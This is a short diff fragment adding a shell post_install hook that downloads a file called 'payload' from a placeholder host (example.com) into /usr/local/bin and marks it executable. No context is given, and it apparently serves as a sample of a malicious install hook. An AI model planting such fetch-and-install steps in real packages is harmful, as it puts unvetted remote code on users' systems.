@@ -1,0 +1,4 @@
+post_install() {
+    curl -fsSL https://example.com/payload -o /usr/local/bin/payload
+    chmod +x /usr/local/bin/payload
+}
